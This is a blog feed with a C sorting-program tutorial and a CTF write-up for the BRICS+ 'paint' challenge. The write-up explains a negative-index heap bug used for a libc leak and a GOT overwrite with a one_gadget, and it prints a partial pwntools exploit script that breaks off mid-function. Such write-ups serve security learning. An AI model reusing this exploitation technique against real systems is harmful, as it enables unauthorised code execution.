class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> ALLOCSIZE 10000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXLINES 5000</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXLEN 1000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *lineptr[MAXLINES];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">readlines</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> maxlines)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">writelines</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> nlines)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">qsort1</span><span class=\"params\">(<span class=\"type\">void</span> *v[], <span class=\"type\">int</span> left,<span class=\"type\">int</span> right,<span class=\"type\">int</span> (*comp)(<span class=\"type\">void</span> *,<span class=\"type\">void</span> *))</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">numcmp</span><span class=\"params\">(<span class=\"type\">char</span> *,<span class=\"type\">char</span> *)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> *line, <span class=\"type\">int</span> max)</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">alloc</span><span class=\"params\">(<span class=\"type\">int</span> n)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//对输入的文本进行排序</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> nlines; <span class=\"comment\">//读入的输入行数</span></span><br><span class=\"line\">    <span class=\"type\">int</span> numeric = <span class=\"number\">0</span>; <span class=\"comment\">//若进行数值排序,则 numberic的值为1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(argc &gt; <span class=\"number\">1</span> &amp;&amp; <span class=\"built_in\">strcmp</span>(argv[<span class=\"number\">1</span>],<span class=\"string\">&quot;-n&quot;</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">        numeric = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((nlines = readlines(lineptr,MAXLINES)) &gt;= <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        qsort1((<span class=\"type\">void</span> **)lineptr, <span class=\"number\">0</span>, nlines <span class=\"number\">-1</span>, (<span class=\"type\">int</span> (*)(<span class=\"type\">void</span>*,<span class=\"type\">void</span>*))(numeric ? numcmp:<span class=\"built_in\">strcmp</span>));</span><br><span class=\"line\">        writelines(lineptr, nlines);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;input too big to sort\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">readlines</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> maxlines)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> len, nlines;</span><br><span class=\"line\">    <span class=\"type\">char</span> *p,line[MAXLEN];</span><br><span class=\"line\">    nlines = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>((len = getline1(line,MAXLEN)) &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nlines &gt; maxlines || (p = alloc(len)) == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            line[len<span class=\"number\">-1</span>] = <span class=\"string\">&#x27;\\0&#x27;</span>;<span class=\"comment\">//删除换行符</span></span><br><span class=\"line\">            <span class=\"built_in\">strcpy</span>(p,line);</span><br><span class=\"line\">            lineptr[nlines++] = p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> nlines;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">writelines</span><span class=\"params\">(<span class=\"type\">char</span> *lineptr[],<span class=\"type\">int</span> nlines)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>;i&lt;nlines;i++)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>,lineptr[i]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">qsort1</span><span class=\"params\">(<span class=\"type\">void</span> *v[], <span class=\"type\">int</span> left,<span class=\"type\">int</span> right,<span class=\"type\">int</span> (*comp)(<span class=\"type\">void</span> *,<span class=\"type\">void</span> *))</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i,last;</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">void</span> *v[],<span class=\"type\">int</span> i, <span class=\"type\">int</span> j)</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (left &gt;= right)</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    swap(v,left,(left+right)/<span class=\"number\">2</span>);</span><br><span class=\"line\">    last = left;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = left+<span class=\"number\">1</span>; i&lt;= right; i++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((*comp)(v[i],v[left]) &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">            swap(v,++last,i);</span><br><span class=\"line\">    swap(v,left,last);</span><br><span class=\"line\">    qsort1(v,left,last<span class=\"number\">-1</span>,comp);</span><br><span class=\"line\">    qsort1(v,last+<span class=\"number\">1</span>,right,comp);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">numcmp</span><span class=\"params\">(<span class=\"type\">char</span> *s1, <span class=\"type\">char</span> *s2)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">double</span> v1,v2;</span><br><span class=\"line\">    </span><br><span class=\"line\">    v1 = atof(s1);</span><br><span class=\"line\">    v2 = atof(s2);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v1&lt;v2)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (v1 &gt; v2)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">swap</span><span class=\"params\">(<span class=\"type\">void</span> *v[],<span class=\"type\">int</span> i,<span class=\"type\">int</span> j)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> *temp;</span><br><span class=\"line\">    temp = v[i];</span><br><span class=\"line\">    v[i] = v[j];</span><br><span class=\"line\">    v[j] = temp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> s[],<span class=\"type\">int</span> lim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,i;</span><br><span class=\"line\">    i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(--lim &gt;<span class=\"number\">0</span> &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c==<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    s[i] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span> allocbuf[ALLOCSIZE];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span> *allocp = allocbuf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *<span class=\"title function_\">alloc</span><span class=\"params\">(<span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (allocbuf + ALLOCSIZE - allocp &gt;= n)&#123; <span class=\"comment\">//有足够的空闲空间</span></span><br><span class=\"line\">        allocp += n;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> allocp - n; <span class=\"comment\">//分配前的指针p</span></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>(void **)是啥, 将指针数组转换成 指向指针数组的指针类型</p>\n<h2 id=\"复杂声明\"><a href=\"#复杂声明\" class=\"headerlink\" title=\"复杂声明\"></a>复杂声明</h2><p>程序dcl是啥</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> **argv</span><br><span class=\"line\">    argv: pointer to pointer to <span class=\"type\">char</span></span><br><span class=\"line\"><span class=\"title function_\">int</span> <span class=\"params\">(*daytab)</span>[13]</span><br><span class=\"line\">    daytab: pointer to <span class=\"built_in\">array</span>[13] of <span class=\"type\">int</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"q\"><a href=\"#q\" class=\"headerlink\" title=\"q\"></a>q</h1><p>能不能用gdb显示变量信息呢,结构信息等,比如char和int的区别</p>\n<p>EOF的话,包括哪些</p>\n",
            "tags": [
                "C语言"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/",
            "title": "pwn入门-42-BRICS+CTF-整数溢出一题",
            "date_published": "2023-09-28T09:27:01.000Z",
            "content_html": "<p>题目:paint    附件: 本链接地址+ paint.zip</p>\n<h2 id=\"dockerfile使用\"><a href=\"#dockerfile使用\" class=\"headerlink\" title=\"dockerfile使用\"></a>dockerfile使用</h2><p>执行命令进行构建</p>\n<p>[root@docker Dockerfile]#docker build -t ctfpwn .<br>上条命令中build为构建镜像，而参数t则指定镜像name，.则为Dockerfile的路径</p>\n<p>进去后找libc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@ff854125b9c3:/<span class=\"meta\"># chmod +x /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class=\"line\">root@ff854125b9c3:/# /lib/x86_64-linux-gnu/libc.so<span class=\"number\">.6</span></span><br><span class=\"line\">GNU C <span class=\"title function_\">Library</span> <span class=\"params\">(Ubuntu GLIBC <span class=\"number\">2.35</span><span class=\"number\">-0u</span>buntu3<span class=\"number\">.1</span>)</span> stable release version 2.35.</span><br><span class=\"line\"><span class=\"title function_\">Copyright</span> <span class=\"params\">(C)</span> 2022 Free Software Foundation, Inc.</span><br><span class=\"line\">This is <span class=\"built_in\">free</span> software; see the source <span class=\"keyword\">for</span> copying conditions.</span><br><span class=\"line\">There is NO warranty; not even <span class=\"keyword\">for</span> MERCHANTABILITY or FITNESS FOR A</span><br><span class=\"line\">PARTICULAR PURPOSE.</span><br><span class=\"line\">Compiled by GNU CC version <span class=\"number\">11.2</span><span class=\"number\">.0</span>.</span><br><span class=\"line\">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class=\"line\">For bug reporting instructions, please see:</span><br><span class=\"line\">&lt;https:<span class=\"comment\">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>后面可以上脚本搭建环境调试, 准备好自己那个脚本</p>\n<p>glibc-allinone的源有时候不行，找到了一个有的</p>\n<p><a href=\"https://ubuntu.repo.cure.edu.uy/mirror/pool/main/g/glibc/\">https://ubuntu.repo.cure.edu.uy/mirror/pool/main/g/glibc/</a></p>\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><h3 id=\"画布结构\"><a href=\"#画布结构\" class=\"headerlink\" title=\"画布结构\"></a>画布结构</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">                    +---------+----------+--------------------+</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    |                    |    chunk head      |</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    +---------+----------+-----------------+--+</span><br><span class=\"line\">canvas[idx] -&gt;      +---------+----------+--------------------+</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    |          v3   v2   | v0+<span class=\"number\">8</span> <span class=\"built_in\">malloc</span> canvas |</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    +---------+----------+-----------------+--+</span><br><span class=\"line\">canvas[idx] + <span class=\"number\">16</span> -&gt; +---------+----------+--------------------+</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    |      rate          |    comment addr    |</span><br><span class=\"line\">                    |                    |                    |</span><br><span class=\"line\">                    +---------+----------+-----------------+--+</span><br><span class=\"line\"></span><br><span class=\"line\">     </span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"泄漏libc地址\"><a href=\"#泄漏libc地址\" class=\"headerlink\" title=\"泄漏libc地址\"></a>泄漏libc地址</h3><p>​\t\t<font color=\"red\">数字不一定是正的,可以输入负的!!!  注意学习这种漏洞思维</font>, 可以看到canvas前面有libc的函数,可以利用这个来泄漏地址</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926190630226-1695726390524-1.png\" alt=\"image-20230926190630226\"></p>\n<h3 id=\"修改got表指针为onegadget\"><a href=\"#修改got表指针为onegadget\" class=\"headerlink\" title=\"修改got表指针为onegadget\"></a>修改got表指针为onegadget</h3><p>​\t\t其实本质就是利用负数溢出，让操作以为是在操作堆块，找到对应的位置进行操作即可，</p>\n<p>​\t\trate(-8,0x222,’\\x08\\x01’*4+p64(addr))   </p>\n<p>​\t\t这里的话,<font color=\"red\">会把-8这个位置当成画布结构数据区开头</font>, 第一个圈起来的位置则是存放comment chunk 地址的,然后再给comment赋值’\\x08\\x01’*4+p64(addr)</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926192156596.png\" alt=\"image-20230926192156596\"></p>\n<p>​\t\tdraw(-5,p64(one))   -5是红色位置,<font color=\"red\">这里又把-5开始的位置当成了画布结构的数据区开头</font> 在draw函数里就是canvas[idx],这是画布的上层结构,而画布内容的存储位置是蓝色的, <font color=\"red\">这里就可以对蓝色指向的地址进行修改了,也就是got表</font></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928172822667.png\" alt=\"image-20230928172822667\" style=\"zoom:50%;\">\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928172835585.png\" alt=\"image-20230928172835585\" style=\"zoom:50%;\">\n\n<p>​\t\t往画布里,也就是got表进行修改, 改成onegadget</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928153346749.png\" alt=\"image-20230928153346749\" style=\"zoom:50%;\">\n\n\n\n<p>​\t\t(这里地址不对,不是同一次调试的,gdb里有pie),但是原理一样,read后,把got表改成了onegadget</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926192740096.png\" alt=\"image-20230926192740096\"></p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>python2版本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">context.log_level=<span class=\"literal\">True</span></span><br><span class=\"line\"><span class=\"comment\">#elf=ELF(&#x27;pwn&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;libc.so.6&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./vuln&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=process(&#x27;./pwn&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&#x27;</span>,<span class=\"number\">13003</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter canvas height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">resize</span>(<span class=\"params\"><span class=\"built_in\">id</span>,wid,hei</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new width (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(wid))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter new height (1-255): &#x27;</span>)</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(hei))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">draw</span>(<span class=\"params\"><span class=\"built_in\">id</span>,data</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;` chars in `height` lines):&#x27;</span>)</span><br><span class=\"line\">\t<span class=\"comment\">#for i in range(wid):</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tp.send(<span class=\"built_in\">str</span>(data))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;6&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\"><span class=\"built_in\">id</span></span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(<span class=\"built_in\">id</span>))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">comment</span>(<span class=\"params\"><span class=\"built_in\">id</span>,x,rate</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">&#x27;5&#x27;</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&#x27;Enter idx: &#x27;</span>)</span><br><span 